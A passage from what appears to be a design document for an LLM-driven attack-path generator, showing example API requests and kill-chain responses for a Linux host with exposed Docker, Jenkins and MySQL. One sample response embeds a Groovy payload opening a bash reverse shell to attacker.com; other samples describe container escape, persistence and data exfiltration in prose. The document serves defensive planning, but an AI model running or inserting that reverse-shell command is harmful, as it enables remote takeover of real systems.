- **Service 2 (Detection)**: < 10 seconds, < $0.02
- **Service 3 (Branch)**: < 5 seconds, < $0.01 per branch
- **Total (with 2 branches)**: < 30 seconds, < $0.10
- **Max Bifurcations**: 5 decision points
- **Max Alternatives per Bifurcation**: 3 alternatives

---

## Use Cases

### Use Case 1: Comprehensive Security Assessment

**Scenario:** Security team needs to understand ALL possible attack paths

**Workflow:**
1. Run bifurcated analysis on critical asset
2. Review primary path (most likely attack)
3. Review all branches (alternative scenarios)
4. Prioritize fixes that block multiple paths

**Value:** "Fixing Docker + Jenkins blocks 4 out of 5 attack paths"

---

### Use Case 2: Red Team Planning

**Scenario:** Red team needs multiple attack approaches for engagement

**Workflow:**
1. Run bifurcated analysis on target
2. Select different branches for different team members
3. Execute parallel attacks
4. Document which paths worked

**Value:** Realistic multi-vector attack simulation

---

### Use Case 3: Defense Prioritization

**Scenario:** Limited budget, need to prioritize security controls

**Workflow:**
1. Run bifurcated analysis on all critical assets
2. Identify common bifurcation points across assets
3. Prioritize fixes that appear in multiple attack graphs
4. Measure reduction in total attack paths

**Value:** Data-driven security investment decisions

---

### Use Case 4: Incident Response Planning

**Scenario:** Need to prepare incident response playbooks

**Workflow:**
1. Run bifurcated analysis on production systems
2. For each branch, identify detection points and IOCs
3. Create runbooks for each attack path variant
4. Pre-position monitoring at bifurcation points

**Value:** Comprehensive IR coverage for all attack scenarios

---

## Response Examples

This section provides complete examples of the responses from all three services.

### Example 1: Service 1 Response (Primary Attack Path)

**Endpoint:** `POST /attack-path`

**Request:**
```json
{
  "platform": "Linux",
  "version_os": "Ubuntu 20.04",
  "open_ports": [2375, 8080, 3306],
  "services": [
    "Docker API on port 2375",
    "Jenkins 2.346.1 on port 8080",
    "MySQL 5.7.33 on port 3306"
  ],
  "vulnerabilities": [
    "CVE-2021-41773: Apache path traversal",
    "CVE-2021-3156: Sudo heap overflow"
  ],
  "security_controls": ["fail2ban"],
  "mfa_enabled": false,
  "internet_exposed": true,
  "configurations": ["Docker API exposed without TLS authentication"]
}
```

**Response:**
```json
{
  "attack_path": [
    "Reconnaissance: Port scanning reveals Docker API on port 2375 (unauthenticated), Jenkins 2.346.1 on port 8080, and MySQL 5.7.33 on port 3306. System exposed to internet with weak security controls.",
    "Weaponization: Prepare Docker API exploitation tools and commands to deploy malicious containers with host access capabilities.",
    "Delivery: Direct connection to unauthenticated Docker API endpoint from external network. No authentication required due to misconfiguration.",
    "Exploitation: Deploy privileged container with host filesystem mounted at /host and host network access. Container runs with elevated capabilities.",
    "Installation: Create persistence via container restart policy (always) and mount SSH keys to root account through /host/root/.ssh/authorized_keys.",
    "Command and Control: Establish reverse shell from container to attacker C2 infrastructure. Use container's network access to maintain persistent connection.",
    "Actions on Objectives: Exfiltrate sensitive data from mounted host filesystem. Access database credentials from environment variables and application configs."
  ]
}
```

**Characteristics:**
- 7 stages (complete cyber kill chain)
- Each stage is a descriptive string
- Contains specific techniques, tools, and attack details
- Response time: ~5-15 seconds
- Cost: ~$0.01-0.03

---

### Example 2: Service 2 Response (Bifurcation Detection)

**Endpoint:** `POST /attack-path/bifurcations`

**Request:**
```json
{
  "attack_path": [
    "Reconnaissance: Port scanning reveals Docker API on port 2375 (unauthenticated), Jenkins 2.346.1 on port 8080, and MySQL 5.7.33 on port 3306. System exposed to internet with weak security controls.",
    "Weaponization: Prepare Docker API exploitation tools and commands to deploy malicious containers with host access capabilities.",
    "Delivery: Direct connection to unauthenticated Docker API endpoint from external network. No authentication required due to misconfiguration.",
    "Exploitation: Deploy privileged container with host filesystem mounted at /host and host network access. Container runs with elevated capabilities.",
    "Installation: Create persistence via container restart policy (always) and mount SSH keys to root account through /host/root/.ssh/authorized_keys.",
    "Command and Control: Establish reverse shell from container to attacker C2 infrastructure. Use container's network access to maintain persistent connection.",
    "Actions on Objectives: Exfiltrate sensitive data from mounted host filesystem. Access database credentials from environment variables and application configs."
  ],
  "host": {
    "platform": "Linux",
    "version_os": "Ubuntu 20.04",
    "open_ports": [2375, 8080, 3306],
    "services": [
      "Docker API on port 2375",
      "Jenkins 2.346.1 on port 8080",
      "MySQL 5.7.33 on port 3306"
    ],
    "vulnerabilities": [
      "CVE-2021-41773: Apache path traversal",
      "CVE-2021-3156: Sudo heap overflow"
    ],
    "security_controls": ["fail2ban"],
    "mfa_enabled": false,
    "internet_exposed": true,
    "configurations": ["Docker API exposed without TLS authentication"]
  }
}
```

**Response:**
```json
{
  "bifurcations": [
    {
      "stage_index": 3,
      "stage_name": "Exploitation",
      "attacker_context": "Attacker has deployed a privileged container with host filesystem access and network visibility to internal services (Jenkins on 8080, MySQL on 3306).",
      "decision_point": "From the container position, the attacker can see multiple exploitable services on the internal network. Instead of continuing with container escape, the attacker could pivot to these services.",
      "alternatives": [
        {
          "id": "B1",
          "technique": "Pivot to Jenkins exploitation",
          "reason": "Jenkins 2.346.1 is accessible from container network without authentication. The /script endpoint allows arbitrary Groovy code execution.",
          "probability": "high"
        },
        {
          "id": "B2",
          "technique": "Pivot to MySQL database",
          "reason": "MySQL 5.7.33 is accessible from container with potential default credentials or weak authentication. Can lead to UDF code execution.",
          "probability": "medium"
        }
      ]
    },
    {
      "stage_index": 4,
      "stage_name": "Installation",
      "attacker_context": "Attacker has achieved persistence via container restart policy and has root-level access through mounted host filesystem.",
      "decision_point": "Multiple persistence mechanisms are available at this privilege level, offering redundancy and stealth alternatives.",
      "alternatives": [
        {
          "id": "B3",
          "technique": "Systemd service persistence",
          "reason": "Can create malicious systemd service unit for automatic execution on boot. More stealthy than SSH key modification.",
          "probability": "high"
        },
        {
          "id": "B4",
          "technique": "Cron job persistence",
          "reason": "Can install cron jobs in /etc/cron.d/ for periodic execution. Less likely to be detected than systemd services.",
          "probability": "medium"
        }
      ]
    }
  ]
}
```

**Characteristics:**
- Identifies 2 bifurcation points (at stages 3 and 4)
- Each bifurcation has 2+ alternative techniques
- Contains metadata ONLY (no continuation paths yet)
- Includes probability assessment (high/medium/low)
- Response time: ~5-10 seconds (1 LLM call)
- Cost: ~$0.01-0.02

**Key Point:** User now sees all decision points immediately and can choose which branches to explore in Service 3.

---

### Example 3: Service 3 Response (Branch Generation)

**Endpoint:** `POST /attack-path/bifurcations/0/branches/B1`

**Request:**
```json
{
  "attack_path": [
    "Reconnaissance: Port scanning reveals Docker API on port 2375 (unauthenticated), Jenkins 2.346.1 on port 8080, and MySQL 5.7.33 on port 3306. System exposed to internet with weak security controls.",
    "Weaponization: Prepare Docker API exploitation tools and commands to deploy malicious containers with host access capabilities.",
    "Delivery: Direct connection to unauthenticated Docker API endpoint from external network. No authentication required due to misconfiguration.",
    "Exploitation: Deploy privileged container with host filesystem mounted at /host and host network access. Container runs with elevated capabilities.",
    "Installation: Create persistence via container restart policy (always) and mount SSH keys to root account through /host/root/.ssh/authorized_keys.",
    "Command and Control: Establish reverse shell from container to attacker C2 infrastructure. Use container's network access to maintain persistent connection.",
    "Actions on Objectives: Exfiltrate sensitive data from mounted host filesystem. Access database credentials from environment variables and application configs."
  ],
  "host": {
    "platform": "Linux",
    "version_os": "Ubuntu 20.04",
    "open_ports": [2375, 8080, 3306],
    "services": [
      "Docker API on port 2375",
      "Jenkins 2.346.1 on port 8080",
      "MySQL 5.7.33 on port 3306"
    ],
    "vulnerabilities": [
      "CVE-2021-41773: Apache path traversal",
      "CVE-2021-3156: Sudo heap overflow"
    ],
    "security_controls": ["fail2ban"],
    "mfa_enabled": false,
    "internet_exposed": true,
    "configurations": ["Docker API exposed without TLS authentication"]
  },
  "bifurcation_index": 0,
  "branch_id": "B1"
}
```

**Response:**
```json
{
  "branch_id": "B1",
  "bifurcation_index": 0,
  "from_stage": 3,
  "continuation_path": [
    "Installation: From container, access Jenkins /script endpoint without authentication. Execute Groovy script to gain code execution on Jenkins server: 'def proc = \"bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'\".execute(); println proc.text'. Establish foothold on Jenkins host.",
    "Command and Control: Set up persistent reverse shell from Jenkins server to attacker infrastructure. Jenkins process runs as 'jenkins' user with access to all build artifacts and credentials. Configure automatic reconnection via Jenkins system Groovy script hook.",
    "Actions on Objectives: Access Jenkins credentials store containing AWS keys, GitHub tokens, and production database passwords. Exfiltrate CI/CD pipeline secrets including service account credentials. Download all build artifacts and source code repositories accessible to Jenkins. Leverage AWS credentials to access production cloud infrastructure."
  ]
}
```

**Characteristics:**
- Contains continuation path for ONE specific branch (B1)
- Starts from the bifurcation point (stage 3)
- Generates remaining stages (4-7 → Installation, C2, Actions on Objectives)
- Specific to the alternative technique (Jenkins exploitation)
- Response time: ~3-5 seconds (1 LLM call)
- Cost: ~$0.005-0.01

**User Control:** If user is also interested in branch B2 (MySQL pivot), they can call:
`POST /attack-path/bifurcations/0/branches/B2`

This generates the MySQL branch continuation independently, and user only pays for what they need!

---

### Example 4: Complete Endpoint Response ⭐ **RECOMMENDED FOR PRODUCTION**

**Endpoint:** `POST /attack-path/complete`

**Request (Single Call):**
```json
{
  "platform": "Linux",
  "version_os": "Ubuntu 20.04",
  "open_ports": [2375, 8080, 3306],
  "services": [
    "Docker API on port 2375",
    "Jenkins 2.346.1 on port 8080",
    "MySQL 5.7.33 on port 3306"
  ],
  "vulnerabilities": [
    "CVE-2021-41773: Apache path traversal",
    "CVE-2021-3156: Sudo heap overflow"
  ],
  "security_controls": ["fail2ban"],
  "mfa_enabled": false,
  "internet_exposed": true,
  "configurations": ["Docker API exposed without TLS authentication"]
}
```

**Response (Complete Analysis):**
```json
{
  "request_id": "550e8400-e29b-41d4-a716-446655440000",
  "primary_path": [
    "Reconnaissance: Port scanning reveals Docker API on port 2375 (unauthenticated), Jenkins 2.346.1 on port 8080, and MySQL 5.7.33 on port 3306. System exposed to internet with weak security controls.",
    "Weaponization: Prepare Docker API exploitation tools and commands to deploy malicious containers with host access capabilities.",
    "Delivery: Direct connection to unauthenticated Docker API endpoint from external network. No authentication required due to misconfiguration.",
    "Exploitation: Deploy privileged container with host filesystem mounted at /host and host network access. Container runs with elevated capabilities.",
    "Installation: Create persistence via container restart policy (always) and mount SSH keys to root account through /host/root/.ssh/authorized_keys.",
    "Command and Control: Establish reverse shell from container to attacker C2 infrastructure. Use container's network access to maintain persistent connection.",
    "Actions on Objectives: Exfiltrate sensitive data from mounted host filesystem. Access database credentials from environment variables and application configs."
  ],
  "bifurcations": [
    {
      "stage_index": 3,
      "stage_name": "Exploitation",
      "attacker_context": "Attacker has deployed a privileged container with host filesystem access and network visibility to internal services (Jenkins on 8080, MySQL on 3306).",
      "decision_point": "From the container position, the attacker can see multiple exploitable services on the internal network. Instead of continuing with container escape, the attacker could pivot to these services.",
      "branches": [
        {
          "branch_id": "B1",
          "technique": "Pivot to Jenkins exploitation",
          "reason": "Jenkins /script endpoint is accessible without authentication from container network",
          "probability": "high",
          "continuation_path": [
            "Installation: From container, access Jenkins /script endpoint without authentication. Execute Groovy script to gain code execution on Jenkins server. Establish foothold on Jenkins host.",
            "Command and Control: Set up persistent reverse shell from Jenkins server to attacker infrastructure. Jenkins process runs as 'jenkins' user with access to all build artifacts and credentials.",
            "Actions on Objectives: Access Jenkins credentials store containing AWS keys, GitHub tokens, and production database passwords. Exfiltrate CI/CD pipeline secrets including service account credentials."
          ]
        },
        {
          "branch_id": "B2",
          "technique": "Pivot to MySQL database compromise",
          "reason": "MySQL accessible from container with default credentials (root/root)",
          "probability": "medium",
          "continuation_path": [
            "Installation: From container, connect to MySQL using default credentials. Create malicious User Defined Function (UDF) to execute system commands. Establish code execution on database host.",
            "Command and Control: Set up persistent backdoor via MySQL trigger that connects to attacker C2 on specific database operations.",
            "Actions on Objectives: Dump entire production database containing customer data, credentials, and business logic. Exfiltrate via DNS tunneling to avoid detection."
          ]
        }
      ]
    }
  ],
  "total_paths": 3,
  "execution_time_seconds": 23.4,
  "llm_calls": {
    "primary_path": 1,
    "bifurcation_detection": 1,
    "branch_generation": 2,
    "total": 4
  },
  "estimated_cost": 0.051
}
```

**Characteristics:**
- ✅ **Single API call** - Client sends host params once
- ✅ **Complete result** - Primary path + bifurcations + ALL branches included
- ✅ **Server-side caching** - Host params cached internally, zero duplication to LLM
- ✅ **Progress tracking** - Terminal shows: `🔍 Generating primary path... 🔀 Detecting bifurcations... 🌿 Generating branch B1... 🌿 Generating branch B2...`
- ✅ **Request ID** - For tracking and debugging
- ✅ **Metadata** - Execution time, LLM calls count, cost estimate
- ✅ **Formatted response** - Ready for frontend display

**Performance:**
- Response time: ~23-35 seconds (full analysis)
- Cost: ~$0.05-0.08 (depends on branch count)
- LLM calls: 4 (1 primary + 1 detection + 2 branches)

**Use Case:** Production deployments where you need complete attack graph analysis in one request

**Terminal Output (During Execution):**
```text
🔍 Phase 1: Generating primary path: 50%|███████          | 1/2 [00:08<00:08, 8.2s/phase]
🔀 Phase 2: Detecting bifurcations: 100%|█████████████████| 2/2 [00:18<00:00, 9.1s/phase]
🌿 Generating branch B2 (bif 0, MySQL pivot): 100%|████████| 2/2 [00:05<00:00, 2.5s/branch]

✅ Complete analysis finished in 23.4s
```

---

### Complete Workflow Example

**Production Approach (Recommended):**
```bash
POST /attack-path/complete → Returns complete analysis (primary + bifurcations + branches)
Cost: $0.051 | Time: 23 seconds | Branches: ALL (2 auto-generated)
```

**Granular Approach (Testing/Debugging):**

**Step 1:** Client calls Service 1
```bash
POST /attack-path → Returns primary path (7 stages)
Cost: $0.02 | Time: 8 seconds
```

**Step 2:** Client calls Service 2 with same host params + primary path
```bash
POST /attack-path/bifurcations → Returns 2 bifurcation points with 4 alternatives (B1, B2, B3, B4)
Cost: $0.015 | Time: 7 seconds
```

**Step 3:** User reviews alternatives, selects 2 interesting branches
```bash
POST /attack-path/bifurcations/0/branches/B1 → Returns Jenkins pivot continuation
Cost: $0.008 | Time: 4 seconds

POST /attack-path/bifurcations/1/branches/B3 → Returns systemd persistence continuation
Cost: $0.008 | Time: 4 seconds
```

**Total Cost:** $0.051 (vs $0.08 if all 4 branches auto-generated)  
**Total Time:** 23 seconds (fast detection + selective generation)  
**Branches Generated:** 2 out of 4 available (user chose only what they needed)

---

## Example Scenario

### Input: `example_request_enhanced.json`

**Key Attributes:**
- Platform: Linux Ubuntu 20.04
- Exposed Docker API (port 2375, unauthenticated)
- Jenkins without authentication
- MySQL with default credentials
- Multiple CVEs

### Expected Primary Path

```
1. Reconnaissance → Port scan reveals Docker, Jenkins, MySQL
2. Initial Access → Exploit unauthenticated Docker API
3. Execution → Deploy privileged container
4. Privilege Escalation → Container escape to host root
5. Persistence → Add SSH key to root account
6. Lateral Movement → Discover internal network
7. Exfiltration → Steal data via egress
```

### Expected Bifurcations

**Bifurcation at Stage 3 (Execution):**
- **Context**: Attacker in container, can see Jenkins + MySQL
- **Branch B1**: Pivot to Jenkins
  - 4. Privilege Escalation: Jenkins Groovy RCE
  - 5. Persistence: Jenkins plugin backdoor
  - 6. Lateral Movement: Access CI/CD secrets
  - 7. Exfiltration: Steal source code + credentials

- **Branch B2**: Pivot to MySQL
  - 4. Privilege Escalation: MySQL UDF code execution
  - 5. Persistence: MySQL trigger backdoor
  - 6. Lateral Movement: Access database credentials
  - 7. Exfiltration: Dump production database

**Bifurcation at Stage 5 (Persistence):**
- **Context**: Attacker has root access
- **Branch B3**: Alternative persistence via systemd
  - 5. Persistence: Create malicious systemd service
  - 6. Lateral Movement: (same as primary)
  - 7. Exfiltration: (same as primary)

### Summary

**Total Attack Paths:** 3
- Primary path (Docker → Container Escape → Root)
- Branch B1 (Jenkins RCE → Plugin Backdoor → Source Code Theft)
- Branch B2 (MySQL UDF → Trigger Backdoor → Database Dump)

**Bifurcation Points:** 1 (at Stage 3 - Execution)

**Criticality:** HIGH - Multiple viable attack vectors from single entry point

**Token Usage Summary (from logs):**
- Primary path: ~5,000 tokens (~$0.0015)
- Bifurcation detection: ~5,000 tokens (~$0.0015)
- Branch B1: ~5,300 tokens (~$0.0015)
- Branch B2: ~5,100 tokens (~$0.0014)
- **Total: ~20,400 tokens (~$0.0059)**
```

---

## Success Criteria

### Feature Complete When:

✅ `/attack-path` endpoint completely unchanged and functional  
✅ `/attack-path/bifurcations` endpoint created and functional (detection only)  
✅ `/attack-path/bifurcations/{bif_idx}/branches/{branch_id}` endpoint created and functional  
✅ `BifurcationDetectionRequest` model accepts `attack_path` (list of strings) + `host` parameters  
✅ `BranchGenerationRequest` model accepts `attack_path` + `host` + `bifurcation_index` + `branch_id`  
✅ Service 2 uses attack_path from Service 1 as input (no regeneration)  
✅ Service 3 generates ONE branch at a time, on-demand  
✅ Three-service workflow validated: Client → Service 1 → Service 2 → Service 3 (for selected branches)  
✅ Token tracking operational - all LLM calls logged to `logs/token_usage.jsonl`  
✅ Token logs include: request_id, call_type, model, tokens, response_time, cost_estimate  
✅ Call types: `primary_path`, `bifurcation_detection`, `branch_B1`, `branch_B2`, etc.  
✅ Log rotation configured (10MB per file, 5 backups)  
✅ Service 2 detects 2+ bifurcation points in provided attack_path  
✅ Each bifurcation includes 2-3 alternative metadata items  
✅ Service 2 response time < 10 seconds  
✅ Service 3 generates complete continuation paths  
✅ Service 3 response time < 5 seconds per branch  
✅ All LLM responses properly validated and error-handled  
✅ Token analysis utility script functional  
✅ Documentation updated (README, TECHNICAL_SPECIFICATION, USAGE)  
✅ Test scenarios created demonstrating three-service workflow  
✅ Unit tests written for new components (including token logger)  
✅ Error in Service 2 doesn't affect Service 1  
✅ Error in Service 3 doesn't affect Service 1 or 2  
✅ Can generate branches independently without re-running detection  

---

## Open Questions

1. **Max Bifurcations**: Should we limit number of bifurcations detected? (Recommendation: max 5)

2. **Max Branches**: Should we limit alternatives per bifurcation? (Recommendation: max 3)

3. **Probability Threshold**: Should we filter out low-probability branches? (Recommendation: include all, let user filter)

4. **Visualization Format**: Minimal metadata only, or include full graph JSON? (Recommendation: minimal metadata now, full JSON when frontend ready)

5. **Streaming**: Should results stream as generated? (Recommendation: defer to Phase 5)

6. **Caching**: Cache bifurcation analysis by host fingerprint? (Recommendation: yes, in Phase 5)

7. **Token Monitoring**: Should token usage trigger alerts/notifications? (Recommendation: start with logs only, add alerting in Phase 5)

8. **Cost Optimization**: Should we use cheaper models for specific passes? (Recommendation: analyze token logs first, optimize based on data)

---

## Next Steps

1. **Review this strategy document** - validate hybrid architecture (complete endpoint + granular endpoints)
2. **Confirm architecture decision** - `/attack-path/complete` as primary production endpoint with server-side caching
3. **Set up development branch** - `feature/bifurcation-complete-endpoint`
4. **Install dependencies** - add `tqdm>=4.66.1` to requirements.txt
5. **Begin Phase 1 implementation** - data models and scaffolding for all 4 endpoints
6. **Prioritize Phase 4** - `/attack-path/complete` endpoint is the primary deliverable
7. **Create tracking issues** - one per phase for project management

---

## References

- MITRE ATT&CK Framework: https://attack.mitre.org/
- Cyber Kill Chain: https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html
- Attack Trees: https://en.wikipedia.org/wiki/Attack_tree
- tqdm Progress Bar: https://github.com/tqdm/tqdm
- Current codebase: `/home/pyramid/workspace/reveald/ai-engine`

---

**Document Status:** ✅ Ready for Implementation  
**Primary Endpoint:** `/attack-path/complete` (server-side caching + progress tracking)  
**Next Action:** Begin Phase 1 - Foundation & Data Models